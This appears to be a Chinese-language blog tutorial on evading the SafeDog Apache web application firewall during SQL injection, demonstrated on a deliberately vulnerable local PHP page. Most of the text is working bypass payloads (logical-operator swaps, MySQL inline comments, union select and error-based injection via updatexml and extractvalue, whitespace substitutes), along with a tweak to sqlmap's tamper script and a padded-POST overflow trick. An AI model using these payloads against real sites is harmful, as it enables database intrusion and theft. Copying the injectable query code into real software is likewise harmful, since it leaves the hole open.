环境:安全狗Apache最新版(http://download.safedog.cn/download/software/safedogwzApache.exe)+phpstudy+windows系统

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1xnf2dvc4j30p20920th.jpg)

本地测试代码:

```
<?php

$id = $_GET['id'];

$con = mysql_connect("localhost","root","root");

if (!$con){die('Could not connect: ' . mysql_error());}

mysql_select_db("dvwa", $con);

$query = "SELECT first_name,last_name FROM users WHERE user_id = '$id'; ";

$result = mysql_query($query)or die('<pre>'.mysql_error().'</pre>');

while($row = mysql_fetch_array($result))

{

 echo $row['0'] . "&nbsp" . $row['1'];

 echo "<br />";

}

echo "<br/>";

echo $query;

mysql_close($con);

?>
```

### 绕过拦截and 1=1

首先先稍微测试一番,发现存在安全狗

```
http://127.0.0.1/test.php?id=1 and and 1=1%23  
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1xn9s3nv2j312h0izgnz.jpg)



那么可以试着将and替换成&&,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过

```
http://127.0.0.1/test.php?id=1' %26%26 true%23
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1xnd1xr4nj30ub0dogm7.jpg)

另外在分享一些可以绕过目前版本的安全狗测试payload,(注:mysql支持&&  || ,oracle不支持 && ||）

```
http://127.0.0.1/test.php?id=1'  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
http://127.0.0.1/test.php?id=1'   ||(1) %23 		//使用括号代替空格绕过
//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
http://127.0.0.1/test.php?id=1'  xor 1%23			
http://127.0.0.1/test.php?id=1'  xor true%23
```

### 绕过order by查询

判断查询字段,使用mysql的`/*!*/` 内敛注释去绕过防护,而其中的代码是可以正常执行的

```
http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1xzk579pxj30rn0cg74u.jpg)

### 绕过union select查询

使用union xxx页面正常,

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1xzs0xrl1j30o40cxmxl.jpg)

但是用union和select放在在一起就被发现啦

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1xzuqr9hpj312w0htdi3.jpg)

在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过

```
http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+
```



![](http://ww1.sinaimg.cn/large/0078beR7ly1g1y15lbq8oj30r40bnzkt.jpg)

- 对于数字型注入,可以将其转换成浮点型
- 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,
- 函数中可以插入任何混淆字符绕过waf
- 另外使用-1可以省去空格绕过waf

```
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1yu5i8ptpj30cd094jrg.jpg)

基于报错信息的注入绕安全狗

```
http://127.0.0.1/test.php?id=1' and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
```

### 绕过select from

使用大括号去绕过

```
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1z22ne5lfj31730c2gmb.jpg)

使用反引号去绕过

```
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables
```

使用\N去绕过

```
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
```

括号法去绕过

```
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
```

也可以组合起来

```
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
```

这些都是去掉空格的合法语句,当然如果不拦截/**/或/*!*/的话,也可以尝试这两个

提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。



补充点：php+mysql环境下支持的空格有：

%0a,%0b,%0c,%0d,%20,%09,%a0,/**/

其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。

 

干货分享：使用/*^!$asd%2a--=*/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/**/换成/*^!$asd%2a--=*/即可使用sqlmap跑了。



另外也可以对安全狗实行缓冲区溢出绕waf

缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过

要求是(针对于安全狗而已):

​	GET类型请求转换成POST类型

​	Content-Length头长度大于4008

​	正常参数放置在脏数据后面

![](http://ww1.sinaimg.cn/large/0078beR7ly1g1z2hxvc3aj312z0eqkik.jpg)



